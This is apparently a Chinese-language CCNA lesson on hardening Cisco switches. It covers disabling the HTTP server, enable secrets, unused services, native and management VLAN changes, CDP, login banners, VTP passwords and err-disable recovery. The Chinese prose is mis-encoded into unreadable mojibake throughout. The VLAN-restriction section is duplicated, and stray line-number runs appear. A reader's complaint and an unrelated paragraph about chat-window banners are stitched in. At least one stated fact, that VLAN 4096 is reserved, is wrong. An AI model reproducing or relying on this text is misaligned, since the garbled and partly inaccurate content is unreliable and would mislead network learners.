2Switch#è€Œç”¨ä¸€ä¸ªç®€å•çš„å‘½ä»¤ï¼Œå°±å¯ä»¥å…³é—­ HTTP è®¿é—®ã€‚Switch(config)#no ip http serveræŸ¥çœ‹äº¤æ¢æœºä¸Š HTTP æœåŠ¡å™¨çš„çŠ¶æ€ã€‚Switch#show ip http server statusHTTP server status: DisabledHTTP server port: 80HTTP server authentication method: enableHTTP server access class: 0HTTP server base path: flash:htmlMaximum number of concurrent server connections allowed: 16Server idle time-out: 180 secondsServer life time-out: 180 secondsMaximum number of requests allowed on a connection: 25HTTP server active session modules: ALLHTTP secure server capability: PresentHTTP secure server status: EnabledHTTP secure server port: 443HTTP secure server ciphersuite: 3des-ede-cbc-sha des-cbc-sha rc4-128-md5 rc4-12HTTP secure server client authentication: DisabledHTTP secure server trustpoint:HTTP secure server active session modules: ALLè¿˜å¯ä»¥åœ¨ VTY çº¿è·¯ä¸Šåº”ç”¨æ§åˆ¶åˆ—è¡¨ï¼ˆan access control list, ACLï¼‰ã€‚åœ¨ç¬¬9å¤©çš„è¯¾ç¨‹å°†ä¼šè®²åˆ°ã€‚è®¾ç½®ä½¿èƒ½ç§˜å¯†å£ä»¤ï¼ŒSet an Enable Secret Passwordå…¨å±€é…ç½®æ¨¡å¼å…è®¸ç”¨æˆ·å¯¹äº¤æ¢æœºæˆ–è·¯ç”±å™¨è¿›è¡Œé…ç½®ï¼Œè¿˜å¯ä»¥æ“¦é™¤é…ç½®ï¼Œä»¥åŠé‡ç½®å£ä»¤ã€‚ä½ åŠ¡å¿…è¦è®¾ç½®ä¸€ä¸ªå£ä»¤æˆ–ç§˜å¯†å£ä»¤æ¥ä¿æŠ¤æ­¤æ¨¡å¼ï¼Œè€Œè¿™å®é™…ä¸Šæ˜¯ä¸ºé˜»æ­¢ç”¨æˆ·é—¯è¿‡ï¼ˆget pastï¼‰ç”¨æˆ·æ¨¡å¼ã€‚ä¸€èˆ¬å£ä»¤åœ¨è·¯ç”±å™¨é…ç½®æ–‡ä»¶ä¸­ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œè€Œ enable secret å£ä»¤åˆ™ä¼šè¿›è¡ŒåŠ å¯†ã€‚ä¸Šé¢å·²ç»æåˆ°ï¼Œä½ å®é™…ä¸Šå¯ä»¥åœ¨äº¤æ¢æœºæˆ–è·¯ç”±å™¨ä¸ŠåŒæ—¶è®¾ç½®ä½¿èƒ½å£ä»¤ï¼ˆa passwordï¼‰å’Œä½¿èƒ½ç§˜å¯†å£ä»¤ï¼ˆenable secret passwordï¼‰,ä½†è¿™ä¼šå¸¦æ¥æ··ä¹±ã€‚æ‰€ä»¥è¯·åªè®¾ç½®ä½¿èƒ½ç§˜å¯†å£ä»¤å°±å¥½ã€‚ä¸‹é¢çš„é…ç½®æ–‡ä»¶æ¼”ç¤ºäº†é€šè¿‡åœ¨å‘½ä»¤å‰é”®å…¥ do å…³é”®å­—ï¼Œè€Œæ— éœ€å›åˆ°ç‰¹æƒæ¨¡å¼ï¼Œå°±å¯æ‰§è¡Œè¯¥å‘½ä»¤çš„æƒ…å½¢ã€‚Switch1(config)#enable password ciscoSwitch1(config)#do show runBuilding configuration...Current configuration: 1144 byteshostname Switch1enable password ciscoFarai è¡¥å……é“ -- â€œä½ å¯ä»¥ä½¿ç”¨ service password-encryption å‘½ä»¤ï¼Œå¯¹ä½¿èƒ½å£ä»¤ enable password è¿›è¡Œ 7 çº§åŠ å¯†ã€‚â€é€šè¿‡åœ¨å‘½ä»¤å‰åŠ ä¸Š no å…³é”®å­—åå†æ¬¡æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œå¯ä»¥æ“¦é™¤é…ç½®æ–‡ä»¶ä¸­çš„å¤§å¤šæ•°è¡Œã€‚ä¸Šé¢ Farai æåˆ°çš„ä½¿ç”¨ service password-encryption å‘½ä»¤æ˜¯æ¯«æ— ä½œç”¨çš„ï¼Œå› ä¸ºè¿™ä¸ªæ–¹æ³•ä»…æä¾›äº†å¼±åŠ å¯†ï¼ˆ7 çº§ï¼‰ï¼Œ è€Œä¸‹é¢çš„ç§˜å¯†å£ä»¤ï¼ˆthe secret passwordï¼‰åˆ™æœ‰ç€å¼ºåŠ å¯†ï¼ˆMD5ï¼‰ã€‚Switch1(config)#no enable passwordSwitch1(config)#enable secret ciscoSwitch1(config)#do show runBuilding configuration...Current configuration: 1169 byteshostname Switch1enable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0 [strong level 5 password] æœåŠ¡ï¼ŒServices 12345678910111213141516171819202122232425262728293031323334353637383940414243444546ä½ æ€»æ˜¯åº”è¯¥å…³é—­é‚£äº›ä½ ä¸ä¼šç”¨åˆ°çš„æœåŠ¡ã€‚æ€ç§‘å·²ç»åœ¨å…³é—­é‚£äº›ä¸å®‰å…¨å’Œå¾ˆå°‘ç”¨åˆ°çš„æœåŠ¡å’Œåè®®ä¸Šåšå¾—å¾ˆå¥½äº†ï¼›å°½ç®¡å¦‚æ­¤ï¼Œä½ å¯èƒ½ä¼šè¦å› æ˜ç¡®è¿™ç‚¹è€Œäº²è‡ªå…³é—­å®ƒä»¬ã€‚åŒæ ·ä¹Ÿä¼šæœ‰ä¸€äº›æœåŠ¡æ˜¯æœ‰å¸®åŠ©çš„ã€‚å¤šæ•°æœåŠ¡å¯åœ¨å…¨å±€é…ç½®æ¨¡å¼ä¸­çš„ service å‘½ä»¤ä¸‹æ‰¾åˆ°ã€‚Switch(config)# service ?compress-config Compress the configuration fileconfig TFTP load config filescounters Control aging of interface countersdhcp Enable DHCP server and relay agentdisable-ip-fast-frag Disable IP particle-based fast fragmentationexec-callback Enable EXEC callbackexec-wait Delay EXEC startup on noisy linesfinger Allow responses to finger requestshide-telnet-addresses Hide destination addresses in telnet commandlinenumber enable line number banner for each execnagle Enable Nagleâ€™s congestion control algorithmold-slip-prompts Allow old scripts to operate with slip/ppppad Enable PAD commandspassword-encryption Encrypt system passwordspassword-recovery Disable password recoveryprompt Enable mode specific promptpt-vty-logging Log significant VTY-Async eventssequence-numbers Stamp logger messages with a sequence numberslave-log Enable log capability of slave IPstcp-keepalives-in Generate keepalives on idle incoming network connectionstcp-keepalives-out Generate keepalives on idle outgoing network connectionstcp-small-servers Enable small TCP servers (e.g., ECHO)telnet-zeroidle Set TCP window 0 when connection is idletimestamps Timestamp debug/log messagesudp-small-servers Enable small UDP servers (e.g., ECHO)ä¸€èˆ¬æ¥è®²ï¼Œæœ‰ä¸‹åˆ—çš„è¿™äº›æœ€å¸¸è§çš„è¦å¼€å¯æˆ–å…³é—­çš„æœåŠ¡ã€‚å…¶å„è‡ªçš„è¯´æ˜åœ¨ä¸­æ‹¬å·é‡Œã€‚no service pad [æ•°æ®åŒ…ç»„è£…ç¨‹åº/åˆ†æ‹†ç¨‹åºï¼Œåœ¨å¼‚æ­¥ç»„ç½‘ä¸­æœ‰ä½¿ç”¨ï¼›å¾ˆå°‘ä½¿ç”¨åˆ°]no service config [é˜»æ­¢äº¤æ¢æœºä»ç½‘ç»œè·å–å…¶é…ç½®æ–‡ä»¶]no service finger [å…³é—­ finger æœåŠ¡å™¨ï¼›å¾ˆå°‘ç”¨åˆ°]no ip icmp redirect [ç»„ç»‡ ICMP é‡å®šå‘ï¼Œè€Œ ICMP é‡å®šå‘å¯è¢«ç”¨äºè·¯ç”±å™¨æŠ•æ¯’]no ip finger [å…³é—­ finger æœåŠ¡çš„å¦ä¸€ç§æ–¹å¼]no ip gratuitous-arps [å…³é—­æ­¤æœåŠ¡ä»¥é˜»æ­¢ä¸­é—´äººæ”»å‡»ï¼ˆman-in-the-middle attacksï¼‰]no ip source-route [å…³é—­ç”±ç”¨æˆ·æä¾›åˆ°ç›®çš„åœ°çš„é€è·³è·¯ç”±(user-provided hop-by-hop routing to destination)]service sequence-numbers [åœ¨æ¯æ¡æ—¥å¿—è®°å½•ä¸­ï¼Œåˆ†é…ç»™å…¶ä¸€ä¸ªç¼–å·ï¼ŒåŒæ—¶æ­¤ç¼–å·åºåˆ—å¢åŠ ]service tcp-keepalive-in [é˜²æ­¢è·¯ç”±å™¨å°†æŒ‚èµ·çš„ç®¡ç†ä¼šè¯ä¸€ç›´ä¿æŒå¼€å¯ï¼Œprevents the router from keeping hung management sessions open]service tcp-keepalive-out [ä¸ sevice tcp-keepalive-in åŠŸèƒ½ä¸€æ ·]no service upp-small-servers [å…³é—­ echo, chargen, discard, daytime ç­‰åŠŸèƒ½ï¼Œè¿™äº›åŠŸèƒ½å¾ˆå°‘ç”¨åˆ°]no service tcp-small-servers [å…³é—­ echo, chargen, discard ç­‰åŠŸèƒ½ï¼Œè¿™äº›åŠŸèƒ½å¾ˆå°‘ç”¨åˆ°]service timestamps debug datetime localtime show-timezone [åœ¨è°ƒè¯•æ¨¡å¼ä¸‹ï¼ˆin debug modeï¼‰, å°†æ¯ä¸ªè®°å½•çš„æ•°æ®åŒ…ï¼Œä½¿ç”¨æœ¬åœ°æ—¶é—´ï¼Œæ‰“ä¸Šæ—¥æœŸå’Œæ—¶é—´çš„æ—¶é—´æˆ³ï¼Œå¹¶æ˜¾ç¤ºæ—¶åŒº]service timestamps log datetime localtime show-timezone [åœ¨éè°ƒè¯•æ¨¡å¼ä¸‹ï¼ˆnot in debug modeï¼‰, å°†æ¯ä¸ªè®°å½•çš„æ•°æ®åŒ…ï¼Œä½¿ç”¨æœ¬åœ°æ—¶é—´ï¼Œæ‰“ä¸Šæ—¥æœŸå’Œæ—¶é—´çš„æ—¶é—´æˆ³ï¼Œå¹¶æ˜¾ç¤ºæ—¶åŒº -- è¿™æœåŠ¡åœ¨æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶éå¸¸æœ‰ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨æ—¶é’Ÿè®¾ç½®æ­£ç¡®çš„æƒ…å†µä¸‹] ä¿®æ”¹åŸç”Ÿ VLANï¼Œ Change the Native VLAN 123456789101112131415161718192021222324äº¤æ¢æœºä½¿ç”¨åŸç”Ÿ VLAN æ¥æ‰¿è½½é‚£äº›ç‰¹å®šçš„åè®®æµé‡ï¼Œè¯¸å¦‚æ€ç§‘å‘ç°åè®®ï¼ˆCisco Discovery Protocol, CDPï¼‰ã€VLAN ä¸­ç»§åè®®ï¼ˆVLAN Trunking Protocol, VTPï¼‰ã€ç«¯å£èšåˆåè®®ï¼ˆPort Aggregation Protocol, PAgPï¼‰ï¼Œä»¥åŠåŠ¨æ€ä¸­ç»§åè®®ï¼ˆDynamic Trunking Protocol, DTPï¼‰ç­‰åè®®ä¿¡æ¯ã€‚é»˜è®¤åŸç”Ÿ VLAN æ€»æ˜¯ VLAN 1; ä½†åŸç”Ÿ VLAN æ˜¯å¯ä»¥æ‰‹åŠ¨è®¾ç½®ä¸ºä»»ä½•æœ‰æ•ˆ VLAN ç¼–å·ï¼ˆé™¤å¼€ 0 å’Œ 4096, å› ä¸ºè¿™äº› VLAN ç¼–å·å¤„äº VLANs çš„ä¿ç•™èŒƒå›´ï¼‰ã€‚ä½ å¯ä»¥ä½¿ç”¨ä¸‹é¢è¾“å‡ºä¸­æ¼”ç¤ºçš„å‘½ä»¤ï¼ˆåœ¨æ¯ä¸ªæ¥å£ä¸‹æ‰§è¡Œçš„ï¼‰ï¼Œæ¥æŸ¥çœ‹åŸç”Ÿ VLANã€‚Switch#show interfaces FastEthernet0/1 switchportName: Fa0/1Switchport: EnabledAdministrative Mode: trunkOperational Mode: trunkAdministrative Trunking Encapsulation: dot1qOperational Trunking Encapsulation: dot1qNegotiation of Trunking: OnAccess Mode VLAN: 1 (default)Trunking Native Mode VLAN: 1 (default)Voice VLAN: noneå°†ç«¯å£æ”¾å…¥ VLAN 1 è¢«è®¤ä¸ºæ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼ˆa security vulnerabilityï¼‰, å…è®¸é»‘å®¢å–å¾—ç½‘ç»œèµ„æºçš„è®¿é—®ã€‚ä¸ºå‡è½»æ­¤é—®é¢˜ï¼Œé¿å…ä»»ä½•ä¸»æœºæ”¾å…¥ VLAN 1 æ˜¯ä¸€ç§æ˜æ™ºå¯å–çš„åšæ³•ã€‚åŒæ—¶ä¹Ÿå¯å°†æ‰€æœ‰ä¸­ç»§æ¥å£ä¸Šçš„åŸç”Ÿ VLAN ä¿®æ”¹ä¸ºæŸä¸ªæœªä½¿ç”¨çš„ VLANã€‚Switch(config-if)#switchport trunk native vlan 888æ³¨æ„ï¼š è¿™æ˜¯ CCNA å¤§çº²ä¸­çš„ä¸€ä¸ªå…³é”®ç›®æ ‡ï¼ˆone of the key objectivesï¼‰, æ‰€ä»¥åŠ¡å¿…ç‰¢è®°ã€‚ä½ è¿˜å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œæ¥é˜»æ­¢åŸç”Ÿ VLAN ä¸Šçš„æ•°æ®é€šè¿‡ä¸­ç»§é“¾è·¯ã€‚Switch(config-if)#switchport trunk allowed vlan remove 888 ä¿®æ”¹ç®¡ç† VLAN, Change the Management VLAN 1234567ç»™äº¤æ¢æœºé…ç½®ä¸€ä¸ª IP åœ°å€ï¼Œä»¥å®ç°ä¸ºç®¡ç†ç›®çš„è€Œè¿œç¨‹ç™»é™†åˆ°å…¶ä¸Šï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ã€‚è¿™åˆå«åšäº¤æ¢æœºè™šæ‹Ÿæ¥å£ï¼ˆSwitch Virtual Interface, SVIï¼‰ã€‚å°†è¯¥ç®¡ç†è®¿é—®åšåˆ°é™¤ VLAN 1 ä¹‹å¤–çš„å…¶å®ƒ VLAN ä¸Šï¼Œæ˜¯ä¸€ç§æ˜æ™ºçš„é¢„é˜²æªæ–½ï¼Œå¦‚ä¸‹é¢çš„è¾“å‡ºæ‰€ç¤ºã€‚Switch(config)#vlan 3Switch(config-vlan)#interface vlan3%LINK-5-CHANGED: Interface Vlan3, changed state to upSwitch(config-if)#ip address 192.168.1.1 255.255.255.0 å…³é—­ CDP, Turn Off CDP 12345678910111213141516171819202122232425262728åé¢ä¼šè®²åˆ°æ€ç§‘å‘ç°åè®®ï¼ˆCisco Discovery Protocol, CDPï¼‰, ä½†åœ¨è¿™é‡Œï¼Œä½ è¦çŸ¥é“ï¼Œåœ¨å¤§å¤šæ•°çš„è·¯ç”±å™¨å’Œäº¤æ¢æœºä¸Šçš„æ¯ä¸ªæ¥å£ä¸‹ï¼Œè¯¥åè®®éƒ½æ˜¯æ‰“å¼€çš„ï¼Œè¿™ä¹Ÿæ˜¯é€šè¡Œçš„åšæ³•ï¼Œå…¶åŠŸèƒ½æ˜¯å‘ç°è·¯ç”±å™¨æˆ–äº¤æ¢æœºä¸Šè¿æ¥çš„æ€ç§‘è®¾å¤‡ã€‚ä½ å¯èƒ½ä¸æ‰“ç®—è®©å…¶å®ƒæ€ç§‘è®¾å¤‡çœ‹åˆ°ä½ çš„ç½‘ç»œè®¾å¤‡çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å…³æ‰è¿™ä¸ªæœåŠ¡ï¼Œè‡³å°‘åº”è¯¥åœ¨é‚£äº›ä½ çš„ç½‘ç»œè¾¹ç¼˜ä¸Šçš„ï¼Œè¿æ¥å…¶å®ƒå…¬å¸æˆ–è€… ISP çš„é‚£äº›è®¾å¤‡ä¸Šå…³é—­ CDPã€‚Farai æŒ‡å‡º -- â€œCDP åœ¨æ¯”å¦‚ ASR è·¯ç”±å™¨çš„æ‰€æœ‰å¹³å°ä¸Šé»˜è®¤éƒ½æœªå¼€å¯ã€‚â€åœ¨ä¸‹é¢çš„è¾“å‡ºä¸­ï¼Œä½ èƒ½çœ‹åˆ°ä¸€å°è¿æ¥æˆ‘çš„äº¤æ¢æœºçš„è·¯ç”±å™¨ï¼Œåœ¨æˆ‘æ‰§è¡Œ show cdp neighbor detail å‘½ä»¤æ—¶ï¼Œå…¶èƒ½çœ‹è§å“ªäº›åŸºæœ¬ä¿¡æ¯ã€‚Router#show cdp neighbor detailDevice ID: Switch1Entry address(es):Platform: Cisco 2960, Capabilities: SwitchInterface: FastEthernet0/0, Port ID (outgoing port): FastEthernet0/2Holdtime: 176Version :Cisco Internetwork Operating System SoftwareIOS (tm) C2960 Software (C2960-I6Q4L2-M), Version 12.1(22)EA4, RELEASE SOFTWARE(fc1)Copyright (c) 1986-2005 by Cisco Systems, Inc.Compiled Wed 18-May-05 22:31 by jharirbaadvertisement version: 2Duplex: fullRouter#ä¸‹é¢çš„å‘½ä»¤å°†å¯¹æ•´ä¸ªè®¾å¤‡å…³é—­ CDPã€‚Switch1(config)#no cdp runè€Œè¦å¯¹æŸä¸ªç‰¹å®šæ¥å£å…³é—­ CDPï¼Œ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ã€‚Switch1(config)#int FastEthernet0/2Switch1(config-if)#no cdp enable æ·»åŠ æ¨ªå¹…æ¶ˆæ¯ï¼ŒAdd a Banner Message 123456789101112131415161718192021222324252627æ¨ªå¹…æ¶ˆæ¯å°†äºæŸç”¨æˆ·ç™»å…¥è·¯ç”±å™¨æˆ–äº¤æ¢æœºæ—¶æ˜¾ç¤ºå‡ºæ¥ã€‚å…¶å¹¶ä¸ä¼šæä¾›ä»»ä½•å®è´¨æ€§çš„å®‰å…¨ï¼Œä½†ä¼šæ˜¾ç¤ºä½ è®¾ç½®çš„è­¦å‘Šä¿¡æ¯ã€‚åœ¨ä¸‹é¢çš„é…ç½®ä¸­ï¼Œæˆ‘é€‰æ‹©çš„æ˜¯ â€œYâ€ å­—æ¯ä½œä¸ºç•Œå®šç¬¦ï¼ˆdelimiting characterï¼‰, ç•Œå®šç¬¦ç”¨ä»¥å‘Šè¯‰è·¯ç”±å™¨ï¼Œæˆ‘å·²è¾“å®Œæ¶ˆæ¯æ–‡å­—ã€‚Switch1(config)#banner motd YEnter TEXT message. End with the character â€˜Yâ€™.KEEP OUT OR YOU WILL REGRET IT YSwitch1(config)#åœ¨æˆ‘ä»äº¤æ¢æœºç™»å…¥åˆ°è·¯ç”±å™¨æ—¶ï¼Œæˆ‘èƒ½çœ‹åˆ°æ¨ªå¹…æ¶ˆæ¯ã€‚é”™åœ¨é€‰æ‹©äº† â€œYâ€ ä½œä¸ºç•Œå®šç¬¦ï¼Œå› ä¸ºå®ƒå‰²é™¤äº†æˆ‘çš„æ¶ˆæ¯æ–‡å­—ã€‚Router#telnet 192.168.1.3Trying 192.168.1.3 ...OpenKEEP OUT ORæ¨ªå¹…æ¶ˆæ¯å¯ä»¥æ˜¯ä»¥ä¸‹è¿™äº›ã€‚åœ¨ç”¨æˆ·çœ‹åˆ°ç™»é™†æç¤ºç¬¦ä¹‹å‰æ˜¾ç¤ºå‡ºæ¥ -- MOTDï¼ˆmessage of the dayï¼‰åœ¨ç”¨æˆ·çœ‹åˆ°ç™»é™†æç¤ºç¬¦ä¹‹å‰æ˜¾ç¤ºå‡ºæ¥ -- Loginåœ¨ç™»é™†æç¤ºç¬¦ä¹‹åæ˜¾ç¤ºç»™ç”¨æˆ· -- Exec ï¼ˆåœ¨ä½ æ‰“ç®—å¯¹æœªæˆæƒç”¨æˆ·éšè—çš„ä¿¡æ¯ï¼‰åœ¨æœ¬ä¹¦ä¸­ï¼Œæ¨ªå¹…æ¶ˆæ¯ä½œä¸ºä¸€äº›å®éªŒçš„ç»„æˆéƒ¨åˆ†ã€‚æˆ‘å»ºè®®ä½ æŒæ¡å…¨éƒ¨ä¸‰ç§ç±»å‹æ¨ªå¹…æ¶ˆæ¯ï¼Œå¹¶ä»¥ç™»å…¥è·¯ç”±å™¨çš„æ–¹å¼æ¥æµ‹è¯•å®ƒä»¬ã€‚ä¾æ®ä½ æ‰€ç”¨çš„å¹³å°å’Œ IOSï¼Œä¼šæœ‰ä¸åŒçš„é€‰æ‹©ã€‚Router(config)#banner ? LINE c banner-text c, where â€˜câ€™ is a delimiting character exec Set EXEC process creation banner incoming Set incoming terminal line banner login Set login banner motd Set Message of the Day banner prompt-timeout Set Message for login authentication timeout slip-ppp Set Message for SLIP/PPP 1234è¯´å®è¯è¿™ä¹¦çš„ç¿»è¯‘å¤ªçƒ‚äº†ã€‚ä»€ä¹ˆå®‰å…¨å£³What is the banner message?Banner MessageBanner messages are responses that are displayed to the user on top of the chat window/screen. A banner can be shown as a response for the following actions: Executing a command. Performing an action on a message (Message Action) è®¾ç½® VTP å£ä»¤ï¼Œ Set a VTP Password 12345678VTP ç¡®ä¿ç½‘ç»œä¸Šäº¤æ¢æœºä¹‹é—´ä¼ è¾“çš„æ˜¯ç²¾ç¡®çš„ VLAN ä¿¡æ¯ã€‚è€Œä¸ºäº†ä¿æŠ¤ VLAN ä¿¡æ¯çš„æ›´æ–°ï¼Œä½ åº”è¯¥åœ¨äº¤æ¢æœºä¸ŠåŠ å…¥ VTP å£ä»¤ï¼ˆè¯¥ VTP åŸŸä¸­æ‰€æœ‰äº¤æ¢æœºä¸Šçš„ VTP å£ä»¤éƒ½åº”ä¸€è‡´ï¼‰ï¼Œ å¦‚ä¸‹é¢è¾“å‡ºæ¼”ç¤ºçš„é‚£æ ·ã€‚Switch1(config)#vtp domain 60daysChanging VTP domain name from NULL to 60daysSwitch1(config)#vtp password ciscoSetting device VLAN database password to ciscoSwitch1(config)# â€‹ 17.é™å®š VLAN ä¿¡æ¯ï¼Œ Restrict VLAN Infaomation 123456789101112131415161718é»˜è®¤ä¸‹çš„äº¤æ¢æœºå…è®¸æ‰€æœ‰ VLANs é€šè¿‡ä¸­ç»§é“¾è·¯ã€‚ä½ å°†å…¶ä¿®æ”¹ä¸ºæŒ‡å®š VLANs æ‰èƒ½é€šè¿‡ä¸­ç»§é“¾è·¯ã€‚å¦‚ä¸‹é¢çš„è¾“å‡ºæ‰€ç¤ºã€‚Switch1(config)#int FastEthernet0/4Switch1(config-if)#switchport mode trunkSwitch1(config-if)#switchport trunk allowed vlan ? WORD VLAN IDs of the allowed VLANs when this port is in trunking mode add add VLANs to the current list all all VLANs except all VLANs except the following none no VLANs remove remove VLANs from the current listSwitch1(config-if)#switchport trunk allowed vlan 7-12Switch1#show interface trunkPort Mode Encapsulation Status Native vlanFa0/4 on 802.1q trunking 1Port Vlans allowed on trunkFa0/4 7-12 18.ç«¯å£å› å‡ºé”™å…³é—­åçš„æ¢å¤åŠŸèƒ½ï¼ŒError Disable Recovery123456789101112131415161718é»˜è®¤ä¸‹çš„äº¤æ¢æœºå…è®¸æ‰€æœ‰ VLANs é€šè¿‡ä¸­ç»§é“¾è·¯ã€‚ä½ å°†å…¶ä¿®æ”¹ä¸ºæŒ‡å®š VLANs æ‰èƒ½é€šè¿‡ä¸­ç»§é“¾è·¯ã€‚å¦‚ä¸‹é¢çš„è¾“å‡ºæ‰€ç¤ºã€‚Switch1(config)#int FastEthernet0/4Switch1(config-if)#switchport mode trunkSwitch1(config-if)#switchport trunk allowed vlan ? WORD VLAN IDs of the allowed VLANs when this port is in trunking mode add add VLANs to the current list all all VLANs except all VLANs except the following none no VLANs remove remove VLANs from the current listSwitch1(config-if)#switchport trunk allowed vlan 7-12Switch1#show interface trunkPort Mode Encapsulation Status Native vlanFa0/4 on 802.1q trunking 1Port Vlans allowed on trunkFa0/4 7-12 é™å®š VLAN ä¿¡æ¯ï¼Œ Restrict VLAN Infaomation1234567891011121314151617é»˜è®¤ä¸‹çš„äº¤æ¢æœºå…è®¸æ‰€æœ‰ VLANs é€šè¿‡ä¸­ç»§é“¾è·¯ã€‚ä½ å°†å…¶ä¿®æ”¹ä¸ºæŒ‡å®š VLANs æ‰èƒ½é€šè¿‡ä¸­ç»§é“¾è·¯ã€‚å¦‚ä¸‹é¢çš„è¾“å‡ºæ‰€ç¤ºã€‚Switch1(config)#int FastEthernet0/4Switch1(config-if)#switchport mode trunkSwitch1(config-if)#switchport trunk allowed vlan ? WORD VLAN IDs of the allowed VLANs when this port is in trunking mode add add VLANs to the current list all all VLANs except all VLANs except the following none no VLANs remove remove VLANs from the current listSwitch1(config-if)#switchport trunk allowed vlan 7-12Switch1#show interface trunkPort Mode Encapsulation Status Native vlanFa0/4 on 802.1q trunking 1Port Vlans allowed on trunkFa0/4 7-12 ç«¯å£å› å‡ºé”™å…³é—­åçš„æ¢å¤åŠŸèƒ½ï¼ŒError Disable Recovery1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768ç”±ä¸€ç³»åˆ—çš„äº‹ä»¶å¯¼è‡´çš„ï¼Œæ€ç§‘äº¤æ¢æœºå°†å…¶ç«¯å£ç½®ä¸ºä¸€ç§ç‰¹åˆ«çš„å…³é—­æ¨¡å¼ï¼ˆa special diabled modeï¼‰, å«åšå‡ºé”™å…³é—­ï¼ˆerr-disabledï¼‰ã€‚æ­¤ç‰¹æ€§ç®€å•æ¥è®²ï¼Œç”±äºåœ¨æŸä¸ªç‰¹å®šç«¯å£ä¸Šå‘ç”ŸæŸç§é”™è¯¯åï¼Œè¯¥ç«¯å£å°±è¢«å…³é—­äº†ã€‚é”™è¯¯å¯èƒ½æœ‰å¤šç§åŸå› ï¼Œä¹‹æœ€å¸¸è§çš„å°±æ˜¯å‡ºç°è§¦å‘äº†æŸé¡¹ç«¯å£å®‰å…¨ç­–ç•¥ï¼ˆa port security policyï¼‰ã€‚åœ¨æŸä¸ªæœªæˆæƒç”¨æˆ·å°è¯•è¿æ¥åˆ°æŸä¸ªäº¤æ¢æœºç«¯å£æ—¶ï¼Œè¿™æ˜¯é€šå¸¸çš„åšæ³•ï¼Œå®ƒé˜»æ­¢é‚£äº›è¿è§„è®¾å¤‡è®¿é—®ç½‘ç»œã€‚å‡ºé”™å…³é—­ç«¯å£(an err-disabled portï¼‰çœ‹èµ·æ¥ä¼šæ˜¯è¿™æ ·çš„ã€‚Switch# show interface f0/1FastEthernet0/1 is down, line protocol is down [err-disabled].....è€Œä¸ºäº†é‡æ–°ä½¿ç”¨ï¼ˆre-activateï¼‰æŸä¸ªå‡ºé”™å…³é—­æ¥å£ï¼Œä»¥åœ¨è¯¥æ¥å£ä¸Šæ‰§è¡Œ shutdown åŠ no shutdown å‘½ä»¤çš„äººå·¥å¹²é¢„æ˜¯å¿…è¦çš„, ç½‘ç»œå·¥ç¨‹å¸ˆä»¬ä¿—ç§°æ­¤æ“ä½œä¸ºç«¯å£å¼¹è·³(a bouncing the port)ã€‚ä½†æ˜¯ï¼ŒæŸäº›æƒ…å½¢è¦æ±‚ä»åŸç«¯å£çŠ¶æ€è‡ªåŠ¨æ¢å¤è¿‡æ¥ï¼Œè€Œä¸æ˜¯ç­‰åˆ°ç®¡ç†å‘˜æ‰‹åŠ¨å¼€å¯è¯¥ç«¯å£ã€‚æ­¤å‡ºé”™å…³é—­å›å¤æ¨¡å¼ï¼Œé€šè¿‡å°†äº¤æ¢æœºé…ç½®ä¸ºåœ¨ä¾å¼•å‘é€šä¿¡å¤±è´¥äº‹ä»¶çš„ä¸åŒï¼Œè€Œä¸åŒçš„ä¸€æ®µæ—¶é—´åï¼Œè‡ªåŠ¨é‡æ–°æ‰“å¼€å‡ºé”™å…³é—­ç«¯å£çš„æ–¹å¼ï¼Œæ¥å‘æŒ¥ä½œç”¨ã€‚åŒºåˆ†é€šä¿¡å¤±è´¥äº‹ä»¶ï¼Œæä¾›äº†å‡ºé”™å…³é—­æ¢å¤åŠŸèƒ½æ‰€ç›‘æµ‹äº‹ä»¶ä¸Šçš„ç²’åº¦ï¼ˆgranularityï¼‰æ§åˆ¶ã€‚å®Œæˆè¯¥åŠŸèƒ½è®¾ç½®çš„å‘½ä»¤æ˜¯ errdisable recovery cause, åœ¨å…¨å±€è·¯ç”±å™¨é…ç½®æ¨¡å¼ä¸‹è¾“å…¥ã€‚Switch(config)#errdisable recovery cause ? all Enable timer to recover from all causes bpduguard Enable timer to recover from bpdu-guard error disable state dtp-flap Enable timer to recover from dtp-flap error disable state link-flap Enable timer to recover from link-flap error disable state pagp-flap Enable timer to recover from pagp-flap error disable state rootguard Enable timer to recover from root-guard error disable state udld Enable timer to recover from udld error disable state......errdisable recovery cause å‘½ä»¤ä¾è®¾å¤‡å‹å·ä¼šæœ‰æ‰€ä¸åŒï¼Œä½†æœ€å¸¸è§çš„å‚æ•°æœ‰è¿™äº›ã€‚allarp-inspectionbpduguarddhcp-rate-limitlink-flappsecure-violationsecurity-violationstorm-controludldå¤šæ•°å¹³å°ä¸Šç«¯å£è‡ªåŠ¨æ¢å¤çš„é»˜è®¤æ—¶é—´æ˜¯ 300 ç§’ï¼Œæ­¤æ—¶é—´å¯ä»¥ç”¨å…¨å±€é…ç½®å‘½ä»¤ errdisable recovery interval æ‰‹åŠ¨ä¿®æ”¹ã€‚Switch(config)#errdisable recovery interval ? &lt;30-86400&gt; timer-interval(sec)è€Œå‘½ä»¤ show errdisable recovery å‘½ä»¤åˆ™ä¼šæä¾›æœ‰å…³å‡ºé”™å…³é—­æ¢å¤åŠŸèƒ½ï¼ˆthe err-disable recovery functionï¼‰æ¿€æ´»äº†çš„é‚£äº›ç‰¹æ€§çš„ç»†èŠ‚ä¿¡æ¯ï¼Œä»¥åŠå—åˆ°ç›‘æµ‹çš„æ¥å£ï¼Œå¹¶åŒ…å«äº†æ¥å£é‡æ–°å¼€å¯å‰©ä½™æ—¶é—´ã€‚Switch#show errdisable recoveryErrDisable Reason Timer Status----------------- --------------arp-inspection Disabledbpduguard Disabledchannel-misconfig Disableddhcp-rate-limit Disableddtp-flap Disabledgbic-invalid Disabledinline-power Disabledl2ptguard Disabledlink-flap Disabledmac-limit Disabledlink-monitor-failure Disabledloopback Disabledoam-remote-failure Disabledpagp-flap Disabledport-mode-failure Disabledpsecure-violation Enabledsecurity-violation Disabledsfp-config-mismatch Disabledstorm-control Disabledudld 